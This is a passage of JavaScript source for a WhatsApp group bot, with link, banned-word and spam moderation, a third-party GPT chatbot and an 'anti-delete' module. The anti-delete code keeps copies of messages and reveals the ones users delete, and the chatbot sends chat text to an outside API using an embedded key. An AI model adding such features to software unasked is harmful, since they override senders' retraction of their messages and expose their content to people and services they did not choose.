    // Check captions for media messages
    if (m.message.imageMessage?.caption) text = m.message.imageMessage.caption
    if (m.message.videoMessage?.caption) text = m.message.videoMessage.caption
    if (m.message.documentMessage?.caption) text = m.message.documentMessage.caption
    
    const from = m.key.remoteJid
    const sender = m.key.participant || m.key.remoteJid
    
    // Check if it's a group message
    if (!from?.endsWith('@g.us')) return
    
    // Check if anti-link is enabled for this group
    if (!isAntiLinkGroup(from)) return
    
    // Allow group admins and bot to post links
    try {
      const metadata = await PhistarBotInc.groupMetadata(from)
      const participant = metadata.participants.find(p => p.id === sender)
      
      // Allow admins, superadmins, and the bot itself
      if (participant && (participant.admin === 'admin' || participant.admin === 'superadmin')) return
      if (sender === PhistarBotInc.user.id) return
    } catch (e) {
      console.error('Error checking admin status:', e)
      return
    }
    
    // Check if message contains links
    if (containsLink(text)) {
      console.log('Link detected in message:', text)
      const mode = getAntiLinkMode(from)
      
      // Delete the message containing link using latest Baileys method
      try {
        await PhistarBotInc.sendMessage(from, {
          delete: {
            id: m.key.id,
            remoteJid: from,
            fromMe: false,
            participant: sender
          }
        })
        console.log('Message deleted successfully')
      } catch (e) {
        console.error('Error deleting message:', e)
        // Fallback to older method if needed
        try {
          await PhistarBotInc.sendMessage(from, { delete: m.key })
          console.log('Message deleted using fallback method')
        } catch (err) {
          console.error('Fallback delete also failed:', err)
        }
      }
      
      // Handle different modes
      switch (mode) {
        case 'warn':
          const warnCount = await warnUser(from, sender)
          const warningMsg = `⚠️ @${sender.split('@')[0]}! Links are not allowed in this group.\nWarning: ${warnCount}/3`
          
          await PhistarBotInc.sendMessage(from, { 
            text: warningMsg, 
            mentions: [sender] 
          })
          console.log('User warned for posting link')
          
          // Auto-kick after 3 warnings
          if (warnCount >= 3) {
            try {
              await PhistarBotInc.groupParticipantsUpdate(
                from, 
                [sender], 
                'remove'
              )
              await PhistarBotInc.sendMessage(from, { 
                text: `🚫 @${sender.split('@')[0]} has been removed for repeatedly posting links.`, 
                mentions: [sender] 
              })
              clearWarnings(from, sender)
              console.log('User kicked for too many warnings')
            } catch (e) {
              console.error('Error removing user:', e)
            }
          }
          break
          
        case 'kick':
          try {
            await PhistarBotInc.groupParticipantsUpdate(
              from, 
              [sender], 
              'remove'
            )
            await PhistarBotInc.sendMessage(from, { 
              text: `🚫 @${sender.split('@')[0]} has been removed for posting links.`, 
              mentions: [sender] 
            })
            console.log('User kicked for posting link')
          } catch (e) {
            console.error('Error removing user:', e)
          }
          break
          
        case 'delete':
        default:
          // Just delete the message, no additional action
          console.log('Link deleted, no further action taken')
          break
      }
    } else {
      console.log('No link detected in message:', text)
    }
  } catch (error) {
    console.error('Error in anti-link handler:', error)
  }
}
/**
 * SINGLE BIND: prevent multiple registrations after reconnect/hot-reload.
 * Updated for Baileys 2025 message handling
 */
if (!global.__BOUND_ANTI_LINK__) {
  // try to remove existing bound handler if hot-reloading with same function ref
  try {
    PhistarBotInc.ev.off?.('messages.upsert', handleAntiLink)
    PhistarBotInc.ev.removeListener?.('messages.upsert', handleAntiLink)
  } catch {}
  
  // Bind the anti-link handler
  PhistarBotInc.ev.on('messages.upsert', handleAntiLink)
  global.__BOUND_ANTI_LINK__ = true
  console.log('Anti-link handler bound successfully')
}
// --- CHATBOT CONFIG ---
const CHATBOT_CONFIG_PATH = './database/chatbot_config.json'
// ----------------------

// Helper functions for chatbot config
const readChatbotConfig = () => {
  try {
    if (fs.existsSync(CHATBOT_CONFIG_PATH)) {
      const data = fs.readFileSync(CHATBOT_CONFIG_PATH, 'utf8')
      return JSON.parse(data)
    }
    return {}
  } catch (error) {
    console.error('Error reading chatbot config:', error)
    return {}
  }
}

const writeChatbotConfig = (data) => {
  try {
    fs.writeFileSync(CHATBOT_CONFIG_PATH, JSON.stringify(data, null, 2))
    return true
  } catch (error) {
    console.error('Error writing chatbot config:', error)
    return false
  }
}

// Initialize chatbot config for a specific WhatsApp number
const initChatbotConfig = (phoneNumber) => {
  const config = readChatbotConfig()
  if (!config[phoneNumber]) {
    config[phoneNumber] = {
      dm: false,
      group: false,
      enabled: false
    }
    writeChatbotConfig(config)
  }
  return config[phoneNumber]
}

// Get chatbot config for a specific WhatsApp number
const getChatbotConfig = (phoneNumber) => {
  const config = readChatbotConfig()
  return config[phoneNumber] || initChatbotConfig(phoneNumber)
}

// Update chatbot config for a specific WhatsApp number
const updateChatbotConfig = (phoneNumber, newConfig) => {
  const config = readChatbotConfig()
  config[phoneNumber] = { ...config[phoneNumber], ...newConfig }
  return writeChatbotConfig(config)
}

// Chatbot API function
async function getChatGPTResponse(prompt) {
  try {
    const response = await axios.get(
      `https://api.giftedtech.co.ke/api/ai/gpt4?apikey=gifted&q=${encodeURIComponent(prompt)}`,
      { timeout: 30000 } // 30 second timeout
    )

    if (response.data && response.data.success) {
      return response.data.result
    } else {
      throw new Error('API returned unsuccessful response')
    }
  } catch (error) {
    console.error("ChatGPT API Error:", error)
    throw new Error('Failed to get response from AI service')
  }
}

// Chatbot message handler
async function handleChatbotMessage(PhistarBotInc, m, phoneNumber) {
  try {
    // Check if chatbot is enabled for this WhatsApp number
    const chatbotConfig = getChatbotConfig(phoneNumber)
    if (!chatbotConfig.enabled) return

    // Check if message is from a group
    const isGroup = m.key.remoteJid.endsWith('@g.us')
    
    // Determine if we should respond based on settings
    if (isGroup && !chatbotConfig.group) return
    if (!isGroup && !chatbotConfig.dm) return

    // Ignore messages from the bot itself
    if (m.key.fromMe) return

    // Ignore commands (messages starting with prefix)
    const prefix = config.prefix
    if (m.body && m.body.startsWith(prefix)) return

    // Only respond to text messages
    if (!m.body || typeof m.body !== 'string') return

    // Rate limiting - don't respond too frequently
    const now = Date.now()
    const lastResponse = mediaRateLimit.get(`${phoneNumber}:chatbot`) || 0
    if (now - lastResponse < 2000) { // 2 second cooldown
      console.log(`Rate limiting chatbot response for ${phoneNumber}`)
      return
    }
    mediaRateLimit.set(`${phoneNumber}:chatbot`, now)

    // Show typing indicator
    await PhistarBotInc.sendPresenceUpdate('composing', m.key.remoteJid)

    // Get response from ChatGPT API
    const response = await getChatGPTResponse(m.body)

    // Send the response
    await PhistarBotInc.sendMessage(m.key.remoteJid, { text: response }, { quoted: m })

    // Stop typing indicator
    await PhistarBotInc.sendPresenceUpdate('paused', m.key.remoteJid)

  } catch (error) {
    console.error(`Chatbot error for ${phoneNumber}:`, error)
    // Don't send error messages to users to avoid spam
  }
}


let antidelete = true; // Enable by default
// --- ANTI-DELETE CONFIG ---
const MAX_TRACKED_MESSAGES = 1000;
const MESSAGE_TTL = 5 * 60 * 1000;
const ALERT_COOLDOWN = 10000; // 10 seconds cooldown
// --------------------------

// SINGLE BIND: prevent multiple registrations after reconnect/hot-reload
if (typeof global.antideleteInitialized === 'undefined') {
    global.antideleteInitialized = true;
    
    // Store tracked messages with timestamp
    const trackedMessages = new Map();
    // Track recently alerted deletions
    const alertedDeletions = new Map();
    // Get bot number
    const botNumber = await PhistarBotInc.decodeJid(PhistarBotInc.user.id);

    // Improved message tracking
    PhistarBotInc.ev.on('messages.upsert', async (chatUpdate) => {
        try {
            const message = chatUpdate.messages[0];
            if (!message || message.key.fromMe) return;

            const messageId = message.key.id;
            const sender = message.key.remoteJid;
            const chatId = message.key.remoteJid;
            const isGroup = chatId.endsWith('@g.us');
            
            // Extract message content from various types
            let content = '';
            let mediaType = 'text';
            let mediaData = null;
            
            // Text messages
            if (message.message?.conversation) {
                content = message.message.conversation;
            } else if (message.message?.extendedTextMessage?.text) {
                content = message.message.extendedTextMessage.text;
            } 
            // Media with captions
            else if (message.message?.imageMessage) {
                content = message.message.imageMessage.caption || '';
                mediaType = 'image';
                mediaData = message.message.imageMessage;
            } else if (message.message?.videoMessage) {
                content = message.message.videoMessage.caption || '';
                mediaType = 'video';
                mediaData = message.message.videoMessage;
            } else if (message.message?.documentMessage) {
                content = message.message.documentMessage.caption || '';
                mediaType = 'document';
                mediaData = message.message.documentMessage;
            } 
            // Voice messages (using the correct Baileys properties)
            else if (message.message?.audioMessage) {
                if (message.message.audioMessage.ptt) {
                    content = 'Voice note';
                    mediaType = 'ptt';
                } else {
                    content = 'Audio message';
                    mediaType = 'audio';
                }
                mediaData = message.message.audioMessage;
            }
            
            // Track messages with content or media
            if ((content && content.trim().length > 0) || mediaType !== 'text') {
                cleanupOldMessages();
                
                trackedMessages.set(messageId, {
                    sender,
                    chatId,
                    content: content.trim(),
                    timestamp: Date.now(),
                    isGroup,
                    mediaType,
                    mediaData,
                    originalMessage: message // Store the original message for proper forwarding
                });
                
                // Enforce size limit
                if (trackedMessages.size > MAX_TRACKED_MESSAGES) {
                    const oldestId = Array.from(trackedMessages.entries())
                        .reduce((oldest, [id, data]) => 
                            data.timestamp < trackedMessages.get(oldest).timestamp ? id : oldest, 
                        Array.from(trackedMessages.keys())[0]);
                    trackedMessages.delete(oldestId);
                }
            }
        } catch (err) {
            console.error('Error tracking messages:', err);
        }
    });

    // Cleanup function
    function cleanupOldMessages() {
        const now = Date.now();
        for (const [messageId, data] of trackedMessages.entries()) {
            if (now - data.timestamp > MESSAGE_TTL) {
                trackedMessages.delete(messageId);
            }
        }
        for (const [messageId, alertTime] of alertedDeletions.entries()) {
            if (now - alertTime > ALERT_COOLDOWN) {
                alertedDeletions.delete(messageId);
            }
        }
    }

    // Periodic cleanup
    setInterval(cleanupOldMessages, 60000);

    // Unified deletion handler with proper deduplication
    async function handleMessageDeletion(update) {
        try {
            const messageId = update.key.id;
            const chatId = update.key.remoteJid;
            
            // Check if we've recently alerted about this deletion
            if (alertedDeletions.has(messageId)) {
                return; // Already alerted, skip processing
            }
            
            const deletedMessage = trackedMessages.get(messageId);
            if (!deletedMessage) return;
            
            const { sender, content, timestamp, isGroup, mediaType, mediaData, originalMessage } = deletedMessage;
            const senderName = sender.split('@')[0];
            
            // Mark as alerted to prevent duplicates
            alertedDeletions.set(messageId, Date.now());
            
            // Prepare alert message
            let alertText = `🚨 *Anti-Delete Alert* 🚨\n\n` +
                           `👤 *User:* @${senderName}\n` +
                           `📅 *Time:* ${new Date(timestamp).toLocaleTimeString()}\n`;
            
            // Add content based on media type
            if (mediaType === 'text') {
                alertText += `💬 *Deleted Message:* "${content}"`;
            } else {
                alertText += `📁 *Deleted ${mediaType.toUpperCase()}*: ${content || '[No caption]'}`;
            }
            
            try {
                // Handle different scenarios based on your requirements
                if (isGroup) {
                    // GROUP: For voice notes, send alert and resend in group
                    if (mediaType === 'ptt') {
                        await PhistarBotInc.sendMessage(chatId, { 
                            text: alertText,
                            mentions: [sender]
                        });
                        
                        // Resend the voice note to the group
                        await forwardVoiceNote(chatId, originalMessage, senderName);
                    } 
                    // For normal text messages, send alert to owner's DM
                    else if (mediaType === 'text') {
                        await PhistarBotInc.sendMessage(botNumber, { text: alertText });
                    }
                    // For other media types (image, video, document, non-ptt audio), ignore
                } else {
                    // DM: For normal text messages, send alert to bot owner's DM
                    if (mediaType === 'text') {
                        await PhistarBotInc.sendMessage(botNumber, { text: alertText });
                    }
                    // For voice notes in DM, send alert to bot owner's DM
                    else if (mediaType === 'ptt') {
                        await PhistarBotInc.sendMessage(botNumber, { text: alertText });
                        await forwardVoiceNote(botNumber, originalMessage, senderName);
                    }
                    // For other media types in DM, ignore
                }
            } catch (error) {
                console.error('Error sending alert:', error);
                // Fallback to bot owner for text messages only
                if (mediaType === 'text') {
                    await PhistarBotInc.sendMessage(botNumber, { text: alertText });
                }
            }
            
            // Clean up
            trackedMessages.delete(messageId);
            
        } catch (err) {
            console.error('Error in deletion handler:', err);
        }
    }

    // Function to properly forward voice notes using Baileys forwarding
    async function forwardVoiceNote(targetChat, originalMessage, senderName) {
        try {
            // Use Baileys' built-in forwarding functionality
            await PhistarBotInc.sendMessage(targetChat, {
                forward: originalMessage,
                mentions: [senderName + '@s.whatsapp.net']
            });
        } catch (error) {
            console.error('Error forwarding voice note:', error);
            
            // Fallback: try to download and resend the audio
            try {
                const audioData = originalMessage.message.audioMessage;
                const stream = await downloadMediaMessage(originalMessage, 'buffer', {});
                
                await PhistarBotInc.sendMessage(targetChat, {
                    audio: stream,
                    ptt: audioData.ptt || false,
                    mimetype: audioData.mimetype || 'audio/ogg; codecs=opus',
                    mentions: [senderName + '@s.whatsapp.net']
                });
            } catch (fallbackError) {
                console.error('Fallback also failed:', fallbackError);
                // Final fallback: send a text message
                await PhistarBotInc.sendMessage(targetChat, {
                    text: `🔊 Could not resend voice note from @${senderName}`
                });
            }
        }
    }

    // Helper function to download media (if needed for fallback)
    async function downloadMediaMessage(message, type, options) {
        // This would need to be implemented based on your Baileys version
        // For now, we'll just throw an error to use the fallback
        throw new Error('Download not implemented');
    }

    // Detect deletions via messages.update
    PhistarBotInc.ev.on('messages.update', async (updates) => {
        for (const update of updates) {
            if (update.update?.messageStubType === 1) { // Message deleted
                await handleMessageDeletion(update);
            }
        }
    });

    // Alternative detection via message-receipt.update
    PhistarBotInc.ev.on('message-receipt.update', async (receipts) => {
        for (const receipt of receipts) {
            if (receipt.receipt?.type === 'delete') {
                await handleMessageDeletion(receipt);
            }
        }
    });

    console.log('Anti-delete system initialized successfully');
} else {
    console.log('Anti-delete system already initialized, skipping duplicate binding');
}
// --- ANTI-WORD CONFIG ---
const ANTI_WORD_PATH = './database/antiword.json'
const WORD_WARN_DATA_PATH = './database/wordwarndata.json'
// ------------------------

// Helper function to read JSON files safely
const readjsonSafeAntiWord = (path, fallback = {}) => {
  try {
    const data = fs.readFileSync(path, 'utf-8')
    return JSON.parse(data || '{}')
  } catch {
    return fallback
  }
}

// Helper function to write JSON files
const writejsonSafeAntiWord = (path, data) => {
  try {
    fs.writeFileSync(path, JSON.stringify(data, null, 2))
    return true
  } catch {
    return false
  }
}

// Add banned word to group - FIXED
const addBannedWord = (groupId, word) => {
  const data = readjsonSafeAntiWord(ANTI_WORD_PATH, {})
  
  // Initialize the group data if it doesn't exist
  if (!data[groupId]) {
    data[groupId] = { enabled: true, mode: 'delete', sensitivity: 'strict', words: [] }
  }
  
  // Ensure words array exists
  if (!data[groupId].words) {
    data[groupId].words = []
  }
  
  // Check if word already exists (case insensitive)
  const wordLower = word.toLowerCase()
  const alreadyExists = data[groupId].words.some(w => w.toLowerCase() === wordLower)
  
  if (!alreadyExists) {
    data[groupId].words.push(word)
    writejsonSafeAntiWord(ANTI_WORD_PATH, data)
    return true
  }
  
  return false
}

// Remove banned word from group - FIXED
const removeBannedWord = (groupId, word) => {
  const data = readjsonSafeAntiWord(ANTI_WORD_PATH, {})
  
  if (data[groupId] && Array.isArray(data[groupId].words)) {
    const wordLower = word.toLowerCase()
    const index = data[groupId].words.findIndex(w => w.toLowerCase() === wordLower)
    
    if (index > -1) {
      data[groupId].words.splice(index, 1)
      writejsonSafeAntiWord(ANTI_WORD_PATH, data)
      return true
    }
  }
  
  return false
}

// Get banned words for group - FIXED
const getBannedWords = (groupId) => {
  const data = readjsonSafeAntiWord(ANTI_WORD_PATH, {})
  return Array.isArray(data[groupId]?.words) ? data[groupId].words : []
}

// Check if group has anti-word enabled - FIXED
const isAntiWordGroup = (groupId) => {
  const data = readjsonSafeAntiWord(ANTI_WORD_PATH, {})
  return data[groupId] && data[groupId].enabled === true
}

// Get anti-word mode for group - FIXED
const getAntiWordMode = (groupId) => {
  const data = readjsonSafeAntiWord(ANTI_WORD_PATH, {})
  return data[groupId]?.mode || 'delete'
}

// Get sensitivity level for group - FIXED
const getAntiWordSensitivity = (groupId) => {
  const data = readjsonSafeAntiWord(ANTI_WORD_PATH, {})
  return data[groupId]?.sensitivity || 'strict'
}

// Handle warning system for words
const warnUserForWord = async (groupId, userId) => {
  const warnData = readjsonSafeAntiWord(WORD_WARN_DATA_PATH, {})
  
  if (!warnData[groupId]) {
    warnData[groupId] = {}
  }
  
  if (!warnData[groupId][userId]) {
    warnData[groupId][userId] = { count: 0, lastWarn: 0 }
  }
  
  const userWarnData = warnData[groupId][userId]
  userWarnData.count += 1
  userWarnData.lastWarn = Date.now()
  
  writejsonSafeAntiWord(WORD_WARN_DATA_PATH, warnData)
  
  return userWarnData.count
}

// Clear warnings for a user
const clearWordWarnings = (groupId, userId) => {
  const warnData = readjsonSafeAntiWord(WORD_WARN_DATA_PATH, {})
  
  if (warnData[groupId] && warnData[groupId][userId]) {
    delete warnData[groupId][userId]
    writejsonSafeAntiWord(WORD_WARN_DATA_PATH, warnData)
  }
}

// Get warning count for a user
const getWordWarningCount = (groupId, userId) => {
  const warnData = readjsonSafeAntiWord(WORD_WARN_DATA_PATH, {})
  return warnData[groupId]?.[userId]?.count || 0
}

// Enhanced word detection with multiple matching methods
const containsBannedWord = (text, groupId) => {
  if (!text || typeof text !== 'string') return false
  
  const antiWordData = readjsonSafeAntiWord(ANTI_WORD_PATH, {})
  const groupWords = antiWordData[groupId]?.words || []
  const globalWords = antiWordData['global']?.words || []
  
  // Combine group-specific and global banned words
  const allBannedWords = [...groupWords, ...globalWords]
  if (allBannedWords.length === 0) return false
  
  const cleanText = text.toLowerCase().normalize("NFD").replace(/[\u0300-\u036f]/g, "")
  
  // Check for exact matches
  for (const word of allBannedWords) {
    const cleanWord = word.toLowerCase().normalize("NFD").replace(/[\u0300-\u036f]/g, "")
    
    // Exact word match (with word boundaries)
    const exactRegex = new RegExp(`\\b${cleanWord}\\b`, 'i')
    if (exactRegex.test(cleanText)) {
      return { matched: true, word: word, type: 'exact' }
    }
    
    // Partial match (word contained within other words)
    if (cleanText.includes(cleanWord)) {
      return { matched: true, word: word, type: 'partial' }
    }
    
    // Leet speak detection (e.g., b@dword, b4dword)
    const leetPattern = cleanWord
      .replace(/a/gi, '[a@4]')
      .replace(/b/gi, '[b8]')
      .replace(/e/gi, '[e3]')
      .replace(/g/gi, '[g9]')
      .replace(/i/gi, '[i1!]')
      .replace(/l/gi, '[l1]')
      .replace(/o/gi, '[o0]')
      .replace(/s/gi, '[s5$]')
      .replace(/t/gi, '[t7]')
      .replace(/z/gi, '[z2]')
    
    const leetRegex = new RegExp(leetPattern, 'i')
    if (leetRegex.test(cleanText)) {
      return { matched: true, word: word, type: 'leet' }
    }
  }
  
  return { matched: false }
}

// Main anti-word message handler - FIXED TO PROPERLY DELETE MESSAGES
async function handleAntiWord({ messages }) {
  try {
    const m = messages[0]
    if (!m?.message || !m.key) return
    
    const messageType = Object.keys(m.message)[0]
    const supportedTypes = ['conversation', 'extendedTextMessage', 'imageMessage', 'videoMessage', 'documentMessage']
    if (!supportedTypes.includes(messageType)) return
    
    // Extract message content based on type
    let text = ''
    if (m.message.conversation) text = m.message.conversation
    if (m.message.extendedTextMessage?.text) text = m.message.extendedTextMessage.text
    // Check captions for media messages
    if (m.message.imageMessage?.caption) text = m.message.imageMessage.caption
    if (m.message.videoMessage?.caption) text = m.message.videoMessage.caption
    if (m.message.documentMessage?.caption) text = m.message.documentMessage.caption
    
    const from = m.key.remoteJid
    const sender = m.key.participant || m.key.remoteJid
    
    // Check if it's a group message
    if (!from?.endsWith('@g.us')) return
    
    // Check if anti-word is enabled for this group
    if (!isAntiWordGroup(from)) return
    
    // Allow group admins and bot to post messages
    try {
      const metadata = await PhistarBotInc.groupMetadata(from)
      const participant = metadata.participants.find(p => p.id === sender)
      
      // Allow admins, superadmins, and the bot itself
      if (participant && (participant.admin === 'admin' || participant.admin === 'superadmin')) return
      if (sender === PhistarBotInc.user.id) return
    } catch (e) {
      console.error('Error checking admin status:', e)
      return
    }
    
    // Check if message contains banned words
    const detectionResult = containsBannedWord(text, from)
    if (detectionResult.matched) {
      console.log('Banned word detected in message:', detectionResult.word, 'Type:', detectionResult.type)
      
      const sensitivity = getAntiWordSensitivity(from)
      const mode = getAntiWordMode(from)
      
      // Apply sensitivity filter
      if (sensitivity === 'strict' || 
          (sensitivity === 'moderate' && detectionResult.type === 'exact') ||
          (sensitivity === 'lenient' && detectionResult.type === 'exact')) {
        
        // PROPERLY DELETE THE MESSAGE - FIXED METHOD
        try {
          // Method 1: Latest Baileys delete method
          await PhistarBotInc.sendMessage(from, {
            delete: {
              id: m.key.id,
              remoteJid: from,
              fromMe: false,
              participant: sender
            }
          })
          console.log('Message with banned word deleted successfully')
        } catch (deleteError) {
          console.error('Error deleting message (method 1):', deleteError)
          
          try {
            // Method 2: Alternative delete method
            await PhistarBotInc.sendMessage(from, { 
              delete: m.key 
            })
            console.log('Message deleted using alternative method')
          } catch (secondError) {
            console.error('Error deleting message (method 2):', secondError)
            
            try {
              // Method 3: Send a delete request directly
              const messageKey = {
                remoteJid: from,
                fromMe: false,
                id: m.key.id,
                participant: sender
              }
              
              await PhistarBotInc.relayMessage(from, {
                protocolMessage: {
                  key: messageKey,
                  type: 3 // DELETE_MESSAGE
                }
              }, { messageId: m.key.id })
              console.log('Message deleted using protocol method')
            } catch (thirdError) {
              console.error('Error deleting message (method 3):', thirdError)
              // If all deletion methods fail, at least take action on the user
            }
          }
        }
        
        // Handle different modes after successful deletion
        switch (mode) {
          case 'warn':
            const warnCount = await warnUserForWord(from, sender)
            const warningMsg = `⚠️ @${sender.split('@')[0]}! The word "${detectionResult.word}" is not allowed in this group.\nWarning: ${warnCount}/3`
            
            await PhistarBotInc.sendMessage(from, { 
              text: warningMsg, 
              mentions: [sender] 
            })
            console.log('User warned for banned word')
            
            // Auto-kick after 3 warnings
            if (warnCount >= 3) {
              try {
                await PhistarBotInc.groupParticipantsUpdate(
                  from, 
                  [sender], 
                  'remove'
                )
                await PhistarBotInc.sendMessage(from, { 
                  text: `🚫 @${sender.split('@')[0]} has been removed for repeatedly using banned words.`, 
                  mentions: [sender] 
                })
                clearWordWarnings(from, sender)
                console.log('User kicked for too many warnings')
              } catch (e) {
                console.error('Error removing user:', e)
              }
            }
            break
            
          case 'kick':
            try {
              await PhistarBotInc.groupParticipantsUpdate(
                from, 
                [sender], 
                'remove'
              )
              await PhistarBotInc.sendMessage(from, { 
                text: `🚫 @${sender.split('@')[0]} has been removed for using banned words.`, 
                mentions: [sender] 
              })
              console.log('User kicked for banned word')
            } catch (e) {
              console.error('Error removing user:', e)
            }
            break
            
          case 'delete':
          default:
            // Message already deleted, no further action needed
            console.log('Banned word deleted, no further action taken')
            break
        }
      }
    }
  } catch (error) {
    console.error('Error in anti-word handler:', error)
  }
}

// Event binding for anti-word
if (!global.__BOUND_ANTI_WORD__) {
  try {
    PhistarBotInc.ev.off?.('messages.upsert', handleAntiWord)
    PhistarBotInc.ev.removeListener?.('messages.upsert', handleAntiWord)
  } catch {}
  
  PhistarBotInc.ev.on('messages.upsert', handleAntiWord)
  global.__BOUND_ANTI_WORD__ = true
  console.log('Anti-word handler bound successfully')
}

// --- ANTI-SPAM CONFIG ---
const ANTISPAM_DATA_PATH = './database/antispam.json'
const SPAM_WARN_DATA_PATH = './database/spamwarndata.json'
// ------------------------

// Helper functions (same as anti-word)
const readjsonSafe = (path, fallback = {}) => {
  try {
    const data = fs.readFileSync(path, 'utf-8')
    return JSON.parse(data || '{}')
  } catch {
    return fallback
  }
}

const writejsonSafe = (path, data) => {
  try {
    fs.writeFileSync(path, JSON.stringify(data, null, 2))
    return true
  } catch {
    return false
  }
}

// Track user message activity
const userMessageTracker = new Map()

// Initialize group anti-spam settings
const initAntiSpamGroup = (groupId) => {
  const data = readjsonSafe(ANTISPAM_DATA_PATH, {})
  if (!data[groupId]) {
    data[groupId] = {
      enabled: true,
      mode: 'delete',
      maxMessagesPerMinute: 10,
      maxMessageLength: 1000,
      warnThreshold: 3,
      action: 'warn' // warn, mute, kick
    }
    writejsonSafe(ANTISPAM_DATA_PATH, data)
  }
  return data[groupId]
}

// Get anti-spam settings for group
const getAntiSpamSettings = (groupId) => {
  const data = readjsonSafe(ANTISPAM_DATA_PATH, {})
  return data[groupId] || initAntiSpamGroup(groupId)
}

// Update anti-spam settings
const updateAntiSpamSettings = (groupId, settings) => {
  const data = readjsonSafe(ANTISPAM_DATA_PATH, {})
  data[groupId] = { ...data[groupId], ...settings }
  writejsonSafe(ANTISPAM_DATA_PATH, data)
  return true
}

// Check if user is spamming (message rate)
const isUserSpamming = (groupId, userId) => {
  const now = Date.now()
  const key = `${groupId}_${userId}`
  
  if (!userMessageTracker.has(key)) {
    userMessageTracker.set(key, [])
  }
  
  const userMessages = userMessageTracker.get(key)
  // Clean old messages (older than 1 minute)
  const recentMessages = userMessages.filter(time => now - time < 60000)
  recentMessages.push(now)
  userMessageTracker.set(key, recentMessages)
  
  const settings = getAntiSpamSettings(groupId)
  return recentMessages.length > settings.maxMessagesPerMinute
}

// Check if message is too long
const isMessageTooLong = (groupId, message) => {
  const settings = getAntiSpamSettings(groupId)
  return message.length > settings.maxMessageLength
}

// Handle spam warning system
const warnUserForSpam = async (groupId, userId) => {
  const warnData = readjsonSafe(SPAM_WARN_DATA_PATH, {})
  
  if (!warnData[groupId]) {
    warnData[groupId] = {}
  }
  
  if (!warnData[groupId][userId]) {
    warnData[groupId][userId] = { count: 0, lastWarn: 0 }
  }
  
  const userWarnData = warnData[groupId][userId]
  userWarnData.count += 1
  userWarnData.lastWarn = Date.now()
  
  writejsonSafe(SPAM_WARN_DATA_PATH, warnData)
  
  return userWarnData.count
}

// Clear spam warnings for a user
const clearSpamWarnings = (groupId, userId) => {
  const warnData = readjsonSafe(SPAM_WARN_DATA_PATH, {})
  
  if (warnData[groupId] && warnData[groupId][userId]) {
    delete warnData[groupId][userId]
    writejsonSafe(SPAM_WARN_DATA_PATH, warnData)
  }
}

// Get spam warning count for a user
const getSpamWarningCount = (groupId, userId) => {
  const warnData = readjsonSafe(SPAM_WARN_DATA_PATH, {})
  return warnData[groupId]?.[userId]?.count || 0
}

// Main anti-spam message handler
async function handleAntiSpam({ messages }) {
  try {
    const m = messages[0]
    if (!m?.message || !m.key) return
    
    const messageType = Object.keys(m.message)[0]
    const supportedTypes = ['conversation', 'extendedTextMessage', 'imageMessage', 'videoMessage', 'documentMessage']
    if (!supportedTypes.includes(messageType)) return
    
    // Extract message content based on type
    let text = ''
    if (m.message.conversation) text = m.message.conversation
    if (m.message.extendedTextMessage?.text) text = m.message.extendedTextMessage.text
    if (m.message.imageMessage?.caption) text = m.message.imageMessage.caption
    if (m.message.videoMessage?.caption) text = m.message.videoMessage.caption
    if (m.message.documentMessage?.caption) text = m.message.documentMessage.caption
    
    const from = m.key.remoteJid
    const sender = m.key.participant || m.key.remoteJid
    
    // Check if it's a group message
    if (!from?.endsWith('@g.us')) return
    
    // Check if anti-spam is enabled for this group
    const settings = getAntiSpamSettings(from)
    if (!settings.enabled) return
    
    // Allow group admins and bot to post messages
    try {
      const metadata = await PhistarBotInc.groupMetadata(from)
      const participant = metadata.participants.find(p => p.id === sender)
      
      // Allow admins, superadmins, and the bot itself
      if (participant && (participant.admin === 'admin' || participant.admin === 'superadmin')) return
      if (sender === PhistarBotInc.user.id) return
    } catch (e) {
      console.error('Error checking admin status:', e)
      return
    }
    
    let isSpam = false
    let spamType = ''
    
    // Check for message rate spam
    if (isUserSpamming(from, sender)) {
      isSpam = true
      spamType = 'rate'
    }
    
    // Check for long message spam
    if (isMessageTooLong(from, text)) {
      isSpam = true
      spamType = 'length'
    }
    
    if (isSpam) {
      console.log(`Spam detected: ${spamType} by ${sender}`)
      
      // Delete the spam message
      try {
        await PhistarBotInc.sendMessage(from, {
          delete: {
            id: m.key.id,
            remoteJid: from,
            fromMe: false,
            participant: sender
          }
        })
        console.log('Spam message deleted successfully')
      } catch (deleteError) {
        console.error('Error deleting spam message:', deleteError)
      }
      
      // Handle different anti-spam modes
      switch (settings.mode) {
        case 'warn':
          const warnCount = await warnUserForSpam(from, sender)
          let warningMsg = ''
          
          if (spamType === 'rate') {
            warningMsg = `⚠️ @${sender.split('@')[0]}! Please don't send messages too quickly.\nWarning: ${warnCount}/${settings.warnThreshold}`
          } else {
            warningMsg = `⚠️ @${sender.split('@')[0]}! Your message is too long (max ${settings.maxMessageLength} characters).\nWarning: ${warnCount}/${settings.warnThreshold}`
          }
          
          await PhistarBotInc.sendMessage(from, { 
            text: warningMsg, 
            mentions: [sender] 
          })
          console.log('User warned for spam')
          
          // Take action after threshold
          if (warnCount >= settings.warnThreshold) {
            try {
              if (settings.action === 'kick') {
                await PhistarBotInc.groupParticipantsUpdate(
                  from, 
                  [sender], 
                  'remove'
                )
                await PhistarBotInc.sendMessage(from, { 
                  text: `🚫 @${sender.split('@')[0]} has been removed for spamming.`, 
                  mentions: [sender] 
                })
                console.log('User kicked for spamming')
              } else if (settings.action === 'mute') {
                // Mute for 1 hour (3600 seconds)
                await PhistarBotInc.groupParticipantsUpdate(
                  from,
                  [sender],
                  'mute',
                  3600
                )
                await PhistarBotInc.sendMessage(from, { 
                  text: `🔇 @${sender.split('@')[0]} has been muted for 1 hour for spamming.`, 
                  mentions: [sender] 
                })
                console.log('User muted for spamming')
              }
              clearSpamWarnings(from, sender)
            } catch (e) {
              console.error('Error taking action against spammer:', e)
            }
          }
          break
          
        case 'kick':
          try {
            await PhistarBotInc.groupParticipantsUpdate(
              from, 
              [sender], 
              'remove'
            )
            await PhistarBotInc.sendMessage(from, { 
              text: `🚫 @${sender.split('@')[0]} has been removed for spamming.`, 
              mentions: [sender] 
            })
            console.log('User kicked for spamming')
          } catch (e) {
            console.error('Error removing spammer:', e)
          }
          break
          
        case 'delete':
        default:
          // Message already deleted, no further action needed
          console.log('Spam deleted, no further action taken')
          break
      }
    }
  } catch (error) {
    console.error('Error in anti-spam handler:', error)
  }
}

// Event binding for anti-spam
if (!global.__BOUND_ANTI_SPAM__) {
  try {
    PhistarBotInc.ev.off?.('messages.upsert', handleAntiSpam)
    PhistarBotInc.ev.removeListener?.('messages.upsert', handleAntiSpam)
  } catch {}
  
  PhistarBotInc.ev.on('messages.upsert', handleAntiSpam)
